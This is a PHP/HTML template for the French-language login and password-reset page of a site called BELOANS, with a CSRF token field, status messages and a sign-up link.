<section id="login" class="login" data-role="page" data-title="Connectez-vous à votre compte security">
    <div class="corral">
        <div id="content" class="contentContainer ndconn">
            <header style=" margin-bottom: 2em">
                <div align="center">
                    <a href="?p=welcome/index">
                        <img src="public/img/logo.png" style="" alt="BELOANS_LOGO_OFFICIAL">
                    </a>
                </div>
            </header>
            <?php session('token', uniqid() . uniqid()) ?>
            <h1 class="headerText accessAid">Connectez-vous à votre compte</h1>
            <form id="connexion" action="?p=guest/authentication" method="post" class="proceed maskable" name="login" autocomplete="off" novalidate="">
                <?php message('Veillez vous connecter en premier lieu.', 'notConnected', 'danger') ?>
                <?php message('Votre identifiant n\'est pas associé à un compte.', 'notFound', 'danger') ?>
                <?php message('Veillez faire une demande de reinitialisation en premier lieu', 'forgotNoToken', 'danger') ?>
                <?php message('Identifiant ou mot de passe incorrect', 'badPwd', 'danger') ?>
                <?php message('L\'accès à votre compte a été révoquer. Veillez contacter un administrateur.', 'LockedNdkEsleL', 'warning') ?>
                <?php message('Veillez remplir votre identifiant et mot de passe.', 'void', 'danger') ?>

                <?php message('Vous n\'avez pas renseigner votre mail pour la reinitialisation de votre mot de passe.', 'reinsertVoid', 'warning') ?>
                <?php message('Votre mail n\'est pas associer à un compte.', 'reinsertBad', 'warning') ?>
                <?php message('Veillez vérifier vos mails.', 'reinsertGood') ?>
                <input id="token" name="token_csrf" value="<?= session('token') ?>" type="hidden">
                <div id="passwordSection" class="clearfix">
                    <div class="textInput" id="login_emaildiv">
                        <div class="fieldWrapper">
                            <label for="email" class="fieldLabel">Adresse email</label>
                            <input id="email" name="email" class="hasHelp  validateEmpty" required="required" autocomplete="off" placeholder="Numéro de compte ou Email" type="text">
                        </div>
                        <div class="errorMessage" id="emailErrorMessage">
                            <p class="emptyError hide">Saisissez une adresse email</p>
                            <p class="invalidError hide">Le format de cette adresse email n'est pas correct</p>
                        </div>
                    </div>
                    <div class="textInput lastInputField" id="login_passworddiv">
                        <div class="fieldWrapper">
                            <label for="password" class="fieldLabel">Entrez un mot de passe.</label>
                            <input id="password" name="mdp" class="hasHelp validateEmpty pin-password" required="required" placeholder="Entrez un mot de passe." type="password"></div>
                        <div class="errorMessage" id="passwordErrorMessage">
                            <p class="emptyError hide">Entrez un mot de passe.</p>
                        </div>
                    </div>
                </div>
                <div class="actions actionsSpaced">
                    <button style="background-color: #ed5721" class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login">
                        Connexion
                    </button>
                </div>
                <div class="forgotLink">
                    <a style="color: #ed5721" id="oublier" href="#" class="scTrack:unifiedlogin-click-forgot-password">
                        J'ai oublié mon mot de passe
                    </a>
                </div>
            </form>
            <form id="oublieur" method="post" action="?p=guest/forgot">
                <input id="token" name="token_csrf" value="<?= session('token') ?>" type="hidden">
                <div class="textInput" id="login_emaildiv">
                    <div class="fieldWrapper">
                        <label for="email" class="fieldLabel">Adresse email</label>
                        <input id="email" name="email" class="hasHelp  validateEmpty" required="required" autocomplete="off" placeholder="Numéro de compte ou Email" type="text">
                    </div>
                    <div class="errorMessage" id="emailErrorMessage">
                        <p class="emptyError hide">Saisissez une adresse email</p>
                        <p class="invalidError hide">Le format de cette adresse email n'est pas correct</p>
                    </div>
                </div>
                <div class="actions actionsSpaced">
                    <button style="background-color: #ed5721" class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin2" name="btnLogin" value="Login">
                        Recevoir un mail
                    </button>
                </div>
                <div class="forgotLink">
                    <a style="color: #ed5721" id="connect" href="#" class="scTrack:unifiedlogin-click-forgot-password">
                        Me connecter normalement
                    </a>
                </div>
            </form>
            <a style="background-color: rgba(255,144,84,0.28)" href="?p=guest/create" class="button secondary scExit:unifiedlogin-login-click-signUp" id="createAccount">
                Ouvrir un compte
            </a>
        </div>
    </div>
</section>
